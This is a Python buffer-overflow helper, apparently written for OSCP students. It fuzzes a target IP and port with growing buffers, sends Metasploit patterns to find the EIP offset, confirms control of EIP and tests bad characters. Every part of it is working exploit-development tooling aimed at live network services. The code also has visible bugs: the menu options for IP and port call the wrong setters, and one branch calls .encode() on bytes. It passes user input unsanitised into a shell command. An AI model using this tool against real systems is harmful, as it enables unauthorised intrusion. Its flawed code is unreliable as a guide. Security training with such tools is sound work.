#!/usr/bin/python3
import socket
import sys
import os
import subprocess
import argparse

#
# This tool was written for students taking the OSCP
# exam. It will make Buffer Overflow procedure easier
# and faster. Make sure you understand the procedure
# in order to be able to use this tool effectively.
#
#  Author AceSineX - Website : https://bytesdeluge.com
#


#### Global Variables ####
ip = "127.0.0.1"
port = "1337"
size = 0
offset = 0
prefix = ""

## Defining Colors ##
cwhite = "\33[37m"
cblue = "\033[96m"
corange = "\33[33m"
cred = "\33[31m"

#### /Global Variables ####
badchars = (
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

####              ####
#### HouseKeeping ####
####              ####

## Welcome Message & Argument Parsing ##
def argpar():
    global ip, port, size, offset, prefix
    welcome = cblue + "Welcome to Aces BOF Fuzzer :)" + cwhite
    parser = argparse.ArgumentParser(description=welcome)
    parser.add_argument('-ip', help='Target ip', required=False)
    parser.add_argument('-p', help='Target port', required=False, type=int)
    parser.add_argument('-size', help='buffer size', required=False, type=int)
    parser.add_argument('-offset', help='eip offset', required=False, type=int)
    parser.add_argument('-prefix', help='command added before the bytes sent', required=False)
    args = parser.parse_args()

    if(args.ip):
        ip = args.ip
    if(args.p):
        port = args.p
    if(args.size):
        size = args.size
    if(args.offset):
        offset = args.offset
    if(args.prefix):
        prefix = args.prefix

## Welcome Message
def welcome():
    msg = "\n"+cblue+"*****************************\nWelcome to Aces BOF Fuzzer :)"+cwhite
    print(msg)
## 


## Mode 0 Configuration Display
def show_current_config():
    global ip, port, size, offset, prefix
    #Debug
    print(cblue+"\n*****************************\n*****************************\n"+cwhite)
    print(corange+"Your options:")
    print(corange+"ip"+cwhite+" -> "+cred+ip)
    print(corange+"port"+cwhite+" -> "+cred+str(port))
    print(corange+"size"+cwhite+" -> "+cred+str(size))
    print(corange+"offset"+cwhite+" -> "+cred+str(offset))
    print(corange+"prefix"+cwhite+" -> "+cred+str(prefix)+cwhite)
## End of Mode 0


## Mode 1 Control Panel for Changing Configuration
def change_config():
    while(1):
        print(cblue+"\n*****************************\n*****************************\n"+cwhite)
        print("CHANGING SETTINGS:")
        print("MODE: "+cred+"0"+cwhite+" =>Change "+cred+"Buffer Size"+cwhite)
        print("MODE: "+cred+"1"+cwhite+" =>Change "+cred+"eip Offset"+cwhite)
        print("MODE: "+cred+"2"+cwhite+" =>Change "+cred+"Command Prefix"+cwhite)
        print("MODE: "+cred+"3"+cwhite+" =>Change "+cred+"Target IP"+cwhite)
        print("MODE: "+cred+"4"+cwhite+" =>Change "+cred+"Target Port"+cwhite)
        print("MODE: "+cred+"5"+cwhite+" =>"+cred+"Back"+cwhite)
        mode=int(input('ENTER MODE:'+corange))
        if(mode == 0):
            print()
            inp=int(input(cwhite+'Enter new '+cred+'buffer'+cwhite+' size:'+corange))
            change_size(inp)
            print(cred+"Buffer Size"+cwhite+" was set to: "+cred+str(inp)+"\n")
        elif(mode == 1):
            print()
            inp=int(input(cwhite+'Enter new '+cred+'offset'+cwhite+' size:'+corange))
            change_offset(inp)
            print(cred+"Offset"+cwhite+" was set to: "+cred+str(inp)+"\n")
        elif(mode == 2):
            print()
            inp=str(input(cwhite+'Enter new '+cred+'Prefix:'+corange))
            change_prefix(inp)
            print(cred+"Prefix"+cwhite+" was set to: "+cred+inp+"\n")
        elif(mode == 3):
            print()
            inp=str(input(cwhite+'Enter new '+cred+'IP:'+corange))
            change_prefix(inp)
            print(cred+"IP"+cwhite+" was set to: "+cred+inp+"\n")
        elif(mode == 4):
            print()
            inp=int(input(cwhite+'Enter new '+cred+'Port:'+corange))
            change_offset(inp)
            print(cred+"Port"+cwhite+" was set to: "+cred+str(inp)+"\n")
        elif(mode == 5):
            break
## End of Mode 1

## Setters for Configuration
def change_size(inp):
    global size
    size = inp

def change_offset(inp):
    global offset
    offset = inp

def change_prefix(inp):
    global prefix
    prefix = inp

def change_ip(inp):
    global ip
    ip = inp

def change_port(inp):
    global port
    port = inp
## End of Setters


## Mode 2 Send bytes for fuzzing overflow
def send_bytes():
    global ip, port, size, offset, prefix
    while(1):
        print(cblue+"\n*****************************\n*****************************\n"+cwhite)
        print(cred+"MODE"+cwhite+"=> "+cred+" Send Bytes"+cwhite)
        print("Enter below how many "+cred+"bytes"+cwhite+" to "+cred+"send"+cwhite)
        size=int(input('>Bytes:'+corange))

        try:
            
            if(prefix != ""):
                buffer = prefix
                buffer +=  size * "A"
            else:
                buffer = size * "A"

            print(cwhite+"\nSending A's buffer with "+cred+str(size)+" bytes! "+cblue+"Sending..."+cwhite)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            print(buffer)
            s.send(buffer.encode())# Without .encode() it sends str, and it only works with python2
            s.close()
            print (cred+"Sent!"+cwhite)

        except socket.error as msg:
            print (cred+"\nCould not connect! "+cwhite+"Check "+cred+"IP"+cwhite+" and "+cred+"Port"+cwhite+" again")
            print(msg)
            sys.exit()
        
        ans=str(input(cwhite+"\nRetry?["+corange+"Y/n"+cwhite+"]: "+corange))
        if(ans == "N" or ans == "n"):
            break
## End of Mode 2


## Mode 3 Send Pattern
def find_pattern():
    global ip, port, size, offset, prefix
    print(cblue+"\n*****************************\n*****************************\n"+cwhite)
    print(cred+"MODE"+cwhite+"=> "+cred+" Msf-pattern_create"+cwhite)
    if(size == 0):
        size=int(input("Enter size of buffer:"+corange))
    print (cwhite+"Creating msfpattern with size of "+cred+str(size)+cwhite)

    try:
        if(prefix != ""):
            buffer = prefix.encode()
            buf2 = subprocess.check_output("msf-pattern_create -l " + str(size), shell=True)
            buffer += buf2
        else:
            buffer = subprocess.check_output("msf-pattern_create -l " + str(size), shell=True)
            
        print(cwhite+"\nSending pattern with "+cred+str(size)+" bytes! "+cblue+"Sending..."+cwhite)    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        print(buffer)
        s.send(buffer)# Without .encode() it sends str, and it only works with python2
        s.close()
        print (cred+"Sent!"+cwhite)

    except socket.error as msg:
            print (cred+"\nCould not connect! "+cwhite+"Check "+cred+"IP"+cwhite+" and "+cred+"Port"+cwhite+" again")
            print(msg)
            sys.exit()
## End of Mode 3 
    

## Mode 4 Find Offset
def find_offset():
    global ip, port, size, offset, prefix
    print(cblue+"\n*****************************\n*****************************\n"+cwhite)
    print(cred+"MODE"+cwhite+"=> "+cred+" Find offset"+cwhite)
    if(size == 0):
        print()
        size=int(input("Enter size of buffer:"+corange))
    eip = input(cwhite+"EIP Bytes:"+corange)
    print(cwhite)
    output = subprocess.check_output("msf-pattern_offset -l " + str(size) + " -q " + eip, shell=True)
    print(cblue+str(output)+cwhite)#DEBUGGING
    offset = int(output.split()[5])
    print(cred+str(offset)+cwhite)#DEBUGGING
## End of Mode 4


## Mode 5 Checking where the overflow happens
def aabbcc():
    global ip, port, size, offset, prefix
    print(cblue+"\n*****************************\n*****************************\n"+cwhite)
    print(cred+"MODE"+cwhite+"=> "+cred+" A..ABBBC..C"+cwhite)
    if(size == 0):
        print()
        size=int(input("Enter size of buffer:"+corange))
        print(cwhite)
    if(offset == 0):
        offset=int(input("Enter offset:"+corange))
        print(cwhite, end ='')
    
    try:
        if(prefix != ""):
            buffer = prefix
            buffer += offset * "A"
            buffer += "BBBB"
            buffer += (size - offset -4) * "C"
            buffer = buffer.encode()
        else:
            buffer = offset * "A"
            buffer += "BBBB"
            buffer += (size - offset -4) * "C"
            buffer = buffer.encode()

        print(cwhite+"\nSending "+cred+"A..ABBBC..C"+cwhite+" buffer with "+cred+str(size)+" bytes! "+cblue+"Sending..."+cwhite)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        print(buffer)
        s.send(buffer)# Without .encode() it sends str, and it only works with python2
        s.close()
        print (cred+"Sent!"+cwhite)

    except socket.error as msg:
        print (cred+"\nCould not connect! "+cwhite+"Check "+cred+"IP"+cwhite+" and "+cred+"Port"+cwhite+" again")
        print(msg)
        sys.exit()
## End of Mode 5


## Mode 6 Bad Characters
def bad_check():
    global ip, port, size, offset, prefix
    print(cblue+"\n*****************************\n*****************************\n"+cwhite)
    print(cred+"MODE"+cwhite+"=> "+cred+" A..ABBBC..C"+cwhite)
    if(size == 0):
        print()
        size=int(input("Enter size of buffer:"+corange))
        print(cwhite)
    if(offset == 0):
        offset=int(input("Enter offset:"+corange))
        print(cwhite)
    
    print("Choose where to place the badcharacters:")
    print(cred+"Important! Make sure there is enough space, \nbecause this script is not doing any checks"+cwhite)
    print(cred+"Always Use Method 1. If Method 0 is used \nsome bad characters might break the chain, \nthus messing the eip position"+cwhite)
    print("MODE: "+cred+"0"+cwhite+" =>Start of buffer")
    print("MODE: "+cred+"1"+cwhite+" =>After EIP")
    abcoffset=int(input('>Selection: '+corange))
    
    ## Start of Buffer
    if(abcoffset == 0):
        if(prefix != ""):
            buffer = prefix.encode()
            buffer += badchars
            buffer += (offset - len(badchars)) * b"\x41"
            buffer += b"\x42\x42\x42\x42"
            buffer += ((size - offset - 4) * b"\x43")
            #buffer = buffer.encode()
        else:
            buffer = badchars
            buffer += (offset - len(badchars)) * b"\x41"
            buffer += b"\x42\x42\x42\x42"
            buffer += (size - offset - 4) * b"\x43"
            #buffer = buffer.encode()
    ## After EIP
    elif(abcoffset == 1):
        if(prefix != ""):
            buffer = prefix.encode()
            buffer += offset * b"\x41"
            buffer += b"\x42\x42\x42\x42"
            buffer += badchars
            buffer += (size - offset - 4 - len(badchars)) * b"\x43"
            #buffer = buffer.encode()
        else:
            buffer = offset * b"\x41"
            buffer += b"\x42\x42\x42\x42"
            buffer += badchars
            buffer += (size - offset -4 - len(badchars)) * b"\x43"
            #buffer = buffer.encode()
    ## Defaulting to Start
    else:
        print("Invalid selection, defaulting to "+cred+"After EIP"+cwhite)
        if(prefix != ""):
            buffer = prefix.encode()
            buffer += offset * b"\x41"
            buffer += b"\x42\x42\x42\x42"
            buffer += badchars
            buffer += (size - offset - 4 - len(badchars)) * b"\x43"
            #buffer = buffer.encode()
        else:
            buffer = offset * b"\x41"
            buffer += b"\x42\x42\x42\x42"
            buffer += badchars
            buffer += (size - offset -4 - len(badchars)) * b"\x43"
            buffer = buffer.encode()

    try:
        print(cwhite+"\nSending "+cred+"A..ABBBC..C"+cwhite+" buffer with "+cred+str(size)+" bytes! "+cblue+"Sending..."+cwhite)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        print(buffer)
        s.send(buffer)# Without .encode() it sends str, and it only works with python2
        s.close()
        print (cred+"Sent!"+cwhite)
    
    except socket.error as msg:
        print (cred+"\nCould not connect! "+cwhite+"Check "+cred+"IP"+cwhite+" and "+cred+"Port"+cwhite+" again")
        print(msg)
        sys.exit()
## End of Mode 6



## Main Control Panel
def control():
    while(1):
        print(cblue+"\n*****************************\n*****************************\n"+cwhite)
        print("Select MODE:")
        print("MODE: "+cred+"0"+cwhite+" =>Show current configuration")
        print("MODE: "+cred+"1"+cwhite+" =>Change current configuration")
        print("MODE: "+cred+"2"+cwhite+" =>Send X bytes")
        print("MODE: "+cred+"3"+cwhite+" =>Create msfpattern with "+cred+str(size)+" bytes"+cwhite+" and Send it")     
        print("MODE: "+cred+"4"+cwhite+" =>Find offset by providing eip")
        print("MODE: "+cred+"5"+cwhite+" =>Send A..ABBBBC..C Buffer")
        print("MODE: "+cred+"6"+cwhite+" =>Check Bad Characters")
        mode=int(input('ENTER MODE:'+corange))
        if(mode == 0):
            show_current_config()
        elif(mode == 1):
            change_config()
        elif(mode == 2):
            send_bytes()
        elif(mode == 3):
            find_pattern()
        elif(mode == 4):
            find_offset()
        elif(mode == 5):
            aabbcc()
        elif(mode == 6):
            bad_check()


def Main():
    global ip, port, size, offset, prefix
    argpar()
    welcome()
    show_current_config()
    control()

if __name__ == '__main__':
    Main()
